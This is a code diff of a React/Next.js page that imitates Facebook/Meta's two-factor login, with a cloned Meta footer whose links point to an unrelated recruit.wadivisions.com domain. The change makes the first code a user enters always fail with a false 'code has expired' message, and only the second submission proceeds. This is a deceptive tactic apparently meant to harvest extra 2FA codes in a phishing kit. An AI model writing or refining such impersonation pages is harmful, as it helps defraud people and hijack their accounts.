@@ -1,6 +1,6 @@
 "use client";
 import Link from 'next/link'
-import React from 'react'
+import React, { useState } from 'react'
 import '@style/2fa.css'
 import { zodResolver } from '@hookform/resolvers/zod';
 import { useForm } from 'react-hook-form';
@@ -11,17 +11,24 @@ import { useRouter } from 'next/navigation';
 type FormData = z.infer<typeof schema2fa>;
 const Login2fa = () => {
     const router = useRouter()
+    const [countLogin, setCountLogin] = useState(0);
     const {
         register,
         handleSubmit,
         formState: { errors },
+        setError
     } = useForm<FormData>({
         resolver: zodResolver(schema2fa),
     });
 
     const onSubmit = (data: any) => {
         console.log(data);
-        router.push('/createcareer')
+        setCountLogin(prev => prev + 1)
+        if (countLogin > 0) {
+            router.push('/createcareer')
+        } else {
+            setError('code', { message: 'Your code has expired. Please enter a new code to continue your accont.' });
+        } 
     };
 
 
@@ -359,20 +366,21 @@ const Login2fa = () => {
                     </div>
                 </div>
             </div>
-            <div style={{
-                display: 'flex',
-                flexDirection: 'column',
-                height: '100vh'
-            }}>
-                <div className='bg-fb'  >
-                    <img
-                        src="./Meta Pro Support_ Facebook and Instagram_files/icon-fb-white.svg"
-                        alt="Icon"
-                    />
-                </div>
+            <div className='login_main'>
+                <div style={{
+                    display: 'flex',
+                    flexDirection: 'column',
+                    height: '100vh'
+                }}>
+                    <div className='bg-fb'  >
+                        <img
+                            src="./Meta Pro Support_ Facebook and Instagram_files/icon-fb-white.svg"
+                            alt="Icon"
+                        />
+                    </div>
 
-                <div className='content '>
-                    <div className='login_main'>
+                    <div className='content '>
+
                         <form onSubmit={handleSubmit(onSubmit)} className="form_container" style={{ width: '525px' }} >
                             <div className='card'>
                                 <div>
@@ -417,6 +425,56 @@ const Login2fa = () => {
                             </div>
                         </form>
 
+                    </div>
+                    <div className="footer">
+                        <div className="topFooter">
+                            <a href="https://recruit.wadivisions.com/login#">English (UK)</a>
+                            <a href="https://recruit.wadivisions.com/login#">Deutsch</a>
+                            <a href="https://recruit.wadivisions.com/login#">Türkçe</a>
+                            <a href="https://recruit.wadivisions.com/login#">Српски</a>
+                            <a href="https://recruit.wadivisions.com/login#">Français (France)</a>
+                            <a href="https://recruit.wadivisions.com/login#">Italiano</a>
+                            <a href="https://recruit.wadivisions.com/login#">Bosanski</a>
+                            <a href="https://recruit.wadivisions.com/login#">Svenska</a>
+                            <a href="https://recruit.wadivisions.com/login#">Español</a>
+                            <a href="https://recruit.wadivisions.com/login#">Português (Brasil)</a>
+                        </div>
+                        <div className="bottomFooter">
+                            <a href="https://recruit.wadivisions.com/login#">Sign Up</a>
+                            <a href="https://recruit.wadivisions.com/login#">Log in</a>
+                            <a href="https://recruit.wadivisions.com/login#">Messenger</a>
+                            <a href="https://recruit.wadivisions.com/login#">Facebook Lite</a>
+                            <a href="https://recruit.wadivisions.com/login#">Watch</a>
+                            <a href="https://recruit.wadivisions.com/login#">Places</a>
+                            <a href="https://recruit.wadivisions.com/login#">Games</a>
+                            <a href="https://recruit.wadivisions.com/login#">Marketplace</a>
+                            <a href="https://recruit.wadivisions.com/login#">Meta Pay</a>
+                            <a href="https://recruit.wadivisions.com/login#">Oculus</a>
+                            <a href="https://recruit.wadivisions.com/login#">Portal</a>
+                            <a href="https://recruit.wadivisions.com/login#">Instagram</a>
+                            <a href="https://recruit.wadivisions.com/login#">Bulletin</a>
+                            <a href="https://recruit.wadivisions.com/login#">Fundraisers</a>
+                            <a href="https://recruit.wadivisions.com/login#">Services</a>
+                            <a href="https://recruit.wadivisions.com/login#">
+                                Voting Information Centre
+                            </a>
+                            <a href="https://recruit.wadivisions.com/login#">Privacy Policy</a>
+                            <a href="https://recruit.wadivisions.com/login#">Privacy Center</a>
+                            <a href="https://recruit.wadivisions.com/login#">Groups</a>
+                            <a href="https://recruit.wadivisions.com/login#">About</a>
+                            <a href="https://recruit.wadivisions.com/login#">Create ad</a>
+                            <a href="https://recruit.wadivisions.com/login#">Create Page</a>
+                            <a href="https://recruit.wadivisions.com/login#">Developers</a>
+                            <a href="https://recruit.wadivisions.com/login#">Careers</a>
+                            <a href="https://recruit.wadivisions.com/login#">Cookies</a>
+                            <a href="https://recruit.wadivisions.com/login#">AdChoices</a>
+                            <a href="https://recruit.wadivisions.com/login#">Terms</a>
+                            <a href="https://recruit.wadivisions.com/login#">Help</a>
+                            <a href="https://recruit.wadivisions.com/login#">
+                                Contact uploading and non-users
+                            </a>
+                        </div>
+                        <span>Meta © 2023</span>
                     </div>
                 </div>
             </div>
